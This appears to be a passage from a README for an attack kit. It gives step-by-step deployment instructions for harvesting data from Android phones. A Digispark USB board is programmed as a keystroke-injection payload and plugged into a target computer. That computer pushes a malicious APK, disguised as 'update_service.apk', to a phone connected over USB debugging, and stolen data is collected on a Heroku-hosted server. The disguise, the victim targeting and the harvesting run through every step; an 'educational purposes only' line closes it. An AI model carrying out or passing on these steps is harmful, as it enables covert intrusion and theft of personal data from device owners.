02_ANDROID_APP/         - Malicious Android application  
03_SERVER_FILES/        - Server-side scripts and pages
04_TOOLS/               - Helper tools and batch files
05_OUTPUT/              - Harvested data will appear here

🔧 REQUIRED TOOLS:
1. Arduino IDE with DigiKeyboard library
2. Android Studio for building APK
3. Heroku account for server hosting
4. Digispark USB development board

🚀 DEPLOYMENT STEPS:

STEP 1: Build Android APK
- Open 02_ANDROID_APP in Android Studio
- Build -> Build APK
- Rename app-debug.apk to update_service.apk

STEP 2: Setup Server
- Create Heroku account
- Upload all files from 03_SERVER_FILES
- Upload update_service.apk and platform-tools.zip

STEP 3: Program USB
- Open main_payload.ino in Arduino IDE
- Change server URL to your actual Heroku app URL
- Upload to Digispark board

STEP 4: Test Attack
- Connect programmed USB to target computer
- Ensure Android device is connected via USB debugging
- Monitor server logs for collected data

⚠️ SECURITY NOTES:
- Change all "your-actual-server" URLs to your real server
- Use this knowledge for educational purposes only
